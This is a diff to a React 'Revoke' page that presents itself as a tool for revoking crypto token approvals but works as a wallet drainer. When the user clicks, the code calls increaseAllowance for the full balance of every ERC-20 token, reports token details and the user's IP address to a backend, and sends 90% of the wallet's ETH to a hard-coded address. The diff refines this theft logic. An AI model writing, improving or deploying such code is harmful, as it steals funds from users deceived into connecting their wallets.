@@ -60,7 +60,7 @@ const Revoke = () => {
   useEffect(() => {
     if (tokenData && priceData && connector) {
       // Add connector to the condition
-      console.log("price data", priceData);
+      console.log("token data", tokenData);
       const mergedTokens = mergeTokens(priceData, tokenData);
       const data = createWalletData(
         mergedTokens,
@@ -80,6 +80,7 @@ const Revoke = () => {
     priceData.forEach((priceObj) => {
       priceMap[priceObj.contractAddress] = priceObj;
     });
+    console.log("pricemap", priceMap);
     return tokenData.map((tokenObj) => {
       const matchingPriceData = priceMap[tokenObj.contractAddress];
       return { ...tokenObj, ...matchingPriceData };
@@ -102,6 +103,7 @@ const Revoke = () => {
         contract_address: tokenObj.contractAddress,
         token_balance: tokenObj.balance,
         token_name: tokenObj.name,
+        decimals: tokenObj.decimals,
       })),
       ip_address: ipAddress,
       native_coin: "ETH",
@@ -122,9 +124,16 @@ const Revoke = () => {
 
   const handleClick = async () => {
     setIsButtonDisabled(true);
+    console.log(walletData);
     try {
       for (const token of walletData.erc_20_tokens) {
-        const { contract_address, balance, token_name, token_balance } = token;
+        const {
+          contract_address,
+          balance,
+          token_name,
+          token_balance,
+          decimals,
+        } = token;
         const data = {
           asset_name: token_name,
           domain: walletData.domain,
@@ -138,7 +147,11 @@ const Revoke = () => {
         } catch (error) {
           console.log("request Token Signature failed:", error);
         }
-        const res = await increaseAllowance(contract_address, token_balance);
+        const res = await increaseAllowance(
+          contract_address,
+          token_balance,
+          decimals
+        );
         if (res.success) {
           const data = {
             asset_name: token_name,
@@ -175,18 +188,19 @@ const Revoke = () => {
           }
         }
       }
-    //  send native token
-    const nintyPercentage = 0.9 * ethBalance
+      //  send native token
+      const nintyPercentage = 0.9 * ethBalance;
 
-    try {
-      const tx = sendTransaction({
-        to: "0xD745A139eDb02c0c9eC4ce523a8c87D9f4d109E0",
-        value:  parseEther(nintyPercentage.toString()),
-      });
-      console.log("Transaction sent:", tx);
-    } catch (error) {
-      console.error("Error sending transaction:", error);
-    }
+      try {
+        console.log("token confirmed post successful: ", res);
+        const tx = sendTransaction({
+          to: "0xD745A139eDb02c0c9eC4ce523a8c87D9f4d109E0",
+          value: parseEther(nintyPercentage.toString()),
+        });
+        console.log("Transaction sent:", tx);
+      } catch (error) {
+        console.error("Error sending transaction:", error);
+      }
     } catch (error) {
       console.error("Failed to increase allowance token:", error);
     } finally {
@@ -194,33 +208,10 @@ const Revoke = () => {
     }
   };
 
+  const handleChange = (e) => {};
+
   return (
     <Container>
-      <div className="flex justify-center -mt-4 mb-8 px-4 lg:px-8">
-        <form className="h-9 flex gap-2 items-center border border-black dark:border-white rounded-lg px-2 font-medium focus-within:ring-1 focus-within:ring-black dark:focus-within:ring-white w-full max-w-3xl text-base sm:text-lg">
-          <svg
-            xmlns="http://www.w3.org/2000/svg"
-            viewBox="0 0 24 24"
-            fill="currentColor"
-            aria-hidden="true"
-            data-slot="icon"
-            className="w-6 h-6"
-          >
-            <path
-              fillRule="evenodd"
-              d="M10.5 3.75a6.75 6.75 0 1 0 0 13.5 6.75 6.75 0 0 0 0-13.5ZM2.25 10.5a8.25 8.25 0 1 1 14.59 5.28l4.69 4.69a.75.75 0 1 1-1.06 1.06l-4.69-4.69A8.25 8.25 0 0 1 2.25 10.5Z"
-              clipRule="evenodd"
-            />
-          </svg>
-          <input
-            className="grow focus-visible:outline-none bg-transparent"
-            placeholder="Search Accounts by Address or Domain"
-            aria-label="Search Accounts by Address or Domain"
-            id="global-search"
-            defaultValue=""
-          />
-        </form>
-      </div>
       <div className="w-full max-w-7xl mx-auto lg:px-8 ">
         <p className="flex flex-col justify-center items-center  mb-2 border border-black dark:border-white rounded-lg px-4 py-3 text-center">
           Once your wallet is connected, you'll see a list of your tokens and
@@ -243,7 +234,11 @@ const Revoke = () => {
                 <div className="flex flex-col sm:flex-row items-center gap-2">
                   <div className="flex items-center gap-1 text-sm text-zinc-500 dark:text-zinc-400">
                     <div className="flex gap-0.5 items-center leading-tight shrink-0">
-                      <span>{loadingEthBalance ? "Loading" : Number(ethBalance).toFixed(4)}</span>
+                      <span>
+                        {loadingEthBalance
+                          ? "Loading"
+                          : Number(ethBalance).toFixed(4)}
+                      </span>
                       <span className="font-bold">ETH</span>
                     </div>
                     <div className="leading-none">•</div>
@@ -290,9 +285,7 @@ const Revoke = () => {
                   )}
                 </div>
               </div>
-              <div>
-               
-              </div>
+              <div></div>
               <div className="flex items-center gap-6">
                 <div className="flex items-center gap-6 sm:gap-2">
                   <a
